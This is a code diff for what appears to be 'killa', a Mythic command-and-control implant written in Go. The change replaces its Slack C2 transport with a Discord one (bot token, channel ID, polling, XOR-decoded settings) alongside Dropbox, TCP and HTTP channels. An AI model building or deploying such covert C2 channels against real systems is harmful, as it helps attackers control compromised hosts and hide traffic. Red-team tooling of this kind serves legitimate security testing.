@@ -27,7 +27,7 @@ import (
 	"killa/pkg/http"
 	"killa/pkg/profiles"
 	"killa/pkg/rpfwd"
-	"killa/pkg/slack"
+	"killa/pkg/discord"
 	"killa/pkg/socks"
 	"killa/pkg/structs"
 	"killa/pkg/tcp"
@@ -56,10 +56,10 @@ var (
 	workingHoursEnd      string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays          string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
 	tcpBindAddress       string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
-	transportType        string = "http" // Transport profile: http, tcp, slack, dropbox
-	slackBotToken        string = ""     // Slack bot OAuth token
-	slackChannelID       string = ""     // Slack channel or DM ID
-	slackPollInterval    string = "5"    // Slack polling interval seconds
+	transportType        string = "http" // Transport profile: http, tcp, discord, dropbox
+	discordBotToken        string = ""     // Discord bot OAuth token
+	discordChannelID       string = ""     // Discord channel or DM ID
+	discordPollInterval    string = "5"    // Discord polling interval seconds
 	dropboxToken         string = ""     // Dropbox OAuth access token
 	dropboxTaskFolder    string = ""     // Dropbox folder to read inbound instruction files
 	dropboxResultFolder  string = ""     // Dropbox folder to write outbound result files
@@ -103,9 +103,9 @@ func runAgent() {
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
 			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
-			slackBotToken = xorDecodeString(slackBotToken, keyBytes)
-			slackChannelID = xorDecodeString(slackChannelID, keyBytes)
-			slackPollInterval = xorDecodeString(slackPollInterval, keyBytes)
+			discordBotToken = xorDecodeString(discordBotToken, keyBytes)
+			discordChannelID = xorDecodeString(discordChannelID, keyBytes)
+			discordPollInterval = xorDecodeString(discordPollInterval, keyBytes)
 			dropboxToken = xorDecodeString(dropboxToken, keyBytes)
 			dropboxTaskFolder = xorDecodeString(dropboxTaskFolder, keyBytes)
 			dropboxResultFolder = xorDecodeString(dropboxResultFolder, keyBytes)
@@ -253,14 +253,14 @@ func runAgent() {
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
 		commands.SetTCPProfile(tcpProfile)
-	} else if transport == "slack" {
-		if strings.TrimSpace(slackBotToken) == "" || strings.TrimSpace(slackChannelID) == "" {
-			log.Printf("[ERROR] Slack transport requires slack_bot_token and slack_channel_id from Mythic C2 parameters (no .env fallback)")
+	} else if transport == "discord" {
+		if strings.TrimSpace(discordBotToken) == "" || strings.TrimSpace(discordChannelID) == "" {
+			log.Printf("[ERROR] Discord transport requires discord_bot_token and discord_channel_id from Mythic C2 parameters (no .env fallback)")
 			return
 		}
-		pollInterval, _ := strconv.Atoi(slackPollInterval)
-		slackProfile := slack.NewSlackProfile(slackBotToken, slackChannelID, encryptionKey, pollInterval, debugBool)
-		c2 = profiles.NewSlackProfile(slackProfile)
+		pollInterval, _ := strconv.Atoi(discordPollInterval)
+		discordProfile := discord.NewDiscordProfile(discordBotToken, discordChannelID, encryptionKey, pollInterval, debugBool)
+		c2 = profiles.NewDiscordProfile(discordProfile)
 	} else if transport == "dropbox" {
 		if strings.TrimSpace(dropboxToken) == "" {
 			log.Printf("[ERROR] Dropbox transport requires dropbox_token from Mythic C2 parameters (no .env fallback)")
@@ -349,7 +349,7 @@ func runAgent() {
 			profile.HandleRpfwd = rpfwdManager.HandleMessages
 			profile.GetInteractiveOutbound = commands.DrainInteractiveOutput
 			profile.HandleInteractive = commands.RouteInteractiveInput
-		case *slack.SlackProfile:
+		case *discord.DiscordProfile:
 			profile.GetDelegatesOnly = func() []structs.DelegateMessage {
 				return tcpP2P.DrainDelegatesOnly()
 			}
@@ -871,9 +871,9 @@ func clearGlobals() {
 	fallbackHosts = ""
 	tcpBindAddress = ""
 	transportType = ""
-	slackBotToken = ""
-	slackChannelID = ""
-	slackPollInterval = ""
+	discordBotToken = ""
+	discordChannelID = ""
+	discordPollInterval = ""
 	dropboxToken = ""
 	dropboxTaskFolder = ""
 	dropboxResultFolder = ""
